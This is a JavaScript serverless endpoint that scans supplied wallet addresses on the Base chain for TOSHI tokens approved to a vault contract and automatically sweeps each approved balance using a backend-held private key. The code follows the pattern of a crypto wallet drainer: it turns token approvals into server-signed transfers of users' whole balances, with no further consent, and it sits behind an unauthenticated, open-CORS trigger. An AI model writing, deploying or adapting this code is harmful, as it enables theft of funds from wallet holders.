const { ethers } = require('ethers');

// Contract addresses
const VAULT_CONTRACT = '0x514dDA54703a4d89bd44A266d0623611e0B8c686';
const TRADING_WALLET = '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c';

// Known tokens to monitor on Base
const BASE_TOKENS = [
  '0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4', // TOSHI
];

const VAULT_ABI = [
  'function sweepToken(address user, address token, uint256 amount) external'
];

const ERC20_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function symbol() view returns (string)',
  'function decimals() view returns (uint8)'
];

// This endpoint monitors and auto-sweeps approved tokens
// Can be called periodically by a cron job or manually triggered
module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    const { userAddresses } = req.body || {};
    
    if (!userAddresses || !Array.isArray(userAddresses)) {
      return res.status(400).json({ 
        error: 'Invalid request. Provide array of userAddresses to monitor.' 
      });
    }

    console.log(`🔍 Monitoring ${userAddresses.length} wallets for approved tokens...`);

    // Setup Base chain provider
    const provider = new ethers.JsonRpcProvider('https://mainnet.base.org');
    const wallet = new ethers.Wallet(process.env.DEPLOYER_PRIVATE_KEY, provider);
    const vault = new ethers.Contract(VAULT_CONTRACT, VAULT_ABI, wallet);

    const results = {
      timestamp: new Date().toISOString(),
      monitored: userAddresses.length,
      swept: [],
      pending: [],
      errors: []
    };

    // Check each user
    for (const userAddress of userAddresses) {
      if (!ethers.isAddress(userAddress)) {
        results.errors.push({ userAddress, error: 'Invalid address' });
        continue;
      }

      // Check each token
      for (const tokenAddress of BASE_TOKENS) {
        try {
          const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
          
          const [balance, allowance, symbol, decimals] = await Promise.all([
            token.balanceOf(userAddress),
            token.allowance(userAddress, VAULT_CONTRACT),
            token.symbol().catch(() => 'UNKNOWN'),
            token.decimals().catch(() => 18)
          ]);

          const balanceFormatted = ethers.formatUnits(balance, decimals);

          // If user has balance AND has approved the vault
          if (balance > 0n && allowance >= balance) {
            console.log(`💰 Found approved ${symbol}: ${balanceFormatted} from ${userAddress}`);
            
            try {
              // Auto-sweep! (Backend signs, not user)
              const tx = await vault.sweepToken(userAddress, tokenAddress, 0);
              const receipt = await tx.wait();
              
              console.log(`✅ Swept ${symbol} from ${userAddress}: ${tx.hash}`);
              
              results.swept.push({
                user: userAddress,
                token: tokenAddress,
                symbol,
                amount: balanceFormatted,
                txHash: tx.hash,
                gasUsed: receipt.gasUsed.toString()
              });
            } catch (sweepError) {
              console.error(`❌ Sweep failed for ${userAddress}:`, sweepError.message);
              results.errors.push({
                user: userAddress,
                token: tokenAddress,
                symbol,
                error: sweepError.message
              });
            }
          } else if (balance > 0n && allowance < balance) {
            // Has balance but needs approval
            results.pending.push({
              user: userAddress,
              token: tokenAddress,
              symbol,
              balance: balanceFormatted,
              note: 'Waiting for user approval'
            });
          }
          
        } catch (error) {
          console.error(`Error checking ${tokenAddress} for ${userAddress}:`, error.message);
          results.errors.push({
            user: userAddress,
            token: tokenAddress,
            error: error.message
          });
        }
      }
    }

    console.log(`✅ Monitoring complete: ${results.swept.length} swept, ${results.pending.length} pending`);
    
    return res.status(200).json(results);

  } catch (error) {
    console.error('Auto-sweep monitor error:', error);
    return res.status(500).json({ 
      error: 'Failed to monitor approvals',
      details: error.message 
    });
  }
};
